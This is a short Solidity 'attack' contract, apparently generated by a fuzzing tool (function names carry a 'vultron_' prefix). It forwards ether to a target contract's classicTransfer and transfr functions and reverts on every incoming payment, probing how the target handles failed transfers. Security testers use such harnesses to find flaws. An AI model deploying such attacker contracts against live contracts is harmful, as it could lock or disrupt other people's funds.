pragma solidity ^0.4.19;

import "./SafeConditionalHFTransfer.sol";

contract Attack_SafeConditionalHFTransfer0 {

  SafeConditionalHFTransfer public target_contract;

  function Attack_SafeConditionalHFTransfer0(address _targetContract) public payable {
      target_contract = SafeConditionalHFTransfer(_targetContract);
  } 

  function vultron_classicTransfer(uint256 vultron_amount, address to) public payable{
    target_contract.classicTransfer.value(vultron_amount)(to);
  } 

  function vultron_transfr(uint256 vultron_amount, address to) public payable{
    target_contract.transfr.value(vultron_amount)(to);
  } 

  function() public payable {
    revert();
  }
} 
